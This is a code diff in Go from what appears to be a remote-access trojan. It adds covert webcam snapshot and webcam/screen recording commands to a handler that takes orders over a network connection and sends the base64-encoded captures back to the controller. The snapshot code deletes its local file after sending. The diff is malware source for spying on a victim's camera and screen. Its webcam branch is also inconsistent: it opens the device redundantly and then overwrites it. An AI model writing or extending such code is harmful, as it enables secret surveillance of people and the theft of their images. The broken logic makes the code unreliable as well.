@@ -103,7 +103,7 @@ func engage_via(conn net.Conn) {
 			result = screen_capture()
 			conn.Write([]byte(result))
 		} else if cmd == "record_screen" {
-			result = screen_record(5)
+			result = video_recording(0, 5)
 			conn.Write([]byte(result))
 		}
 	}
@@ -126,12 +126,70 @@ func screen_capture() string {
 	return result
 }
 
-func screen_record(t int) string {
-	file := "screen.avi"
-	res := sr.GetPrimary()
-	width, height := res.Width, res.Height
+func webcam_is_available() (bool, string) {
+	var msg string
+	webcam, err := gocv.VideoCaptureDevice(0)
+	if err != nil {
+		msg = "[!] Webcam not found"
+		return false, msg
+	}
+	if !webcam.IsOpened() {
+		msg = "[!] Failed to open webcam"
+		return false, msg
+	}
+	webcam.Close()
+	return true, msg
+}
 
-	capture, _ := gocv.OpenVideoCapture(0)
+func webcam_snap() string {
+	available, err := webcam_is_available()
+	if available {
+		file := "webcam.png"
+		capture, _ := gocv.VideoCaptureDevice(0)
+		img := gocv.NewMat()
+		capture.Read(&img)
+		gocv.IMWrite(file, img)
+		result := b64_file(file)
+		os.Remove(file)
+		return result
+	} else {
+		return err
+	}
+}
+
+func video_recording(tgt int, t int) string {
+	file := "screen.avi"
+	var capture *gocv.VideoCapture
+	var width, height int
+
+	if tgt == 0 {
+		// screen
+
+		capture, _ = gocv.OpenVideoCapture(0)
+		res := sr.GetPrimary()
+		width, height = res.Width, res.Height
+	} else {
+		// webcam
+
+		available, err := webcam_is_available()
+		if available {
+			capture, _ = gocv.VideoCaptureDevice(0)
+			width, height = 640, 480
+		} else {
+			return err
+		}
+		if webcam, err := gocv.VideoCaptureDevice(0); err != nil {
+			return "[!] Webcam not found"
+		} else {
+			if !webcam.IsOpened() {
+				return "[!] Failed to open webcam"
+			}
+			capture = webcam
+			width, height = 640, 480
+		}
+	}
+
+	capture, _ = gocv.OpenVideoCapture(0)
 	capture.Set(gocv.VideoCaptureFrameWidth, float64(width))
 	capture.Set(gocv.VideoCaptureFrameHeight, float64(height))
 	writer, _ := gocv.VideoWriterFile(file, "MJPG", 30, width, height, true)
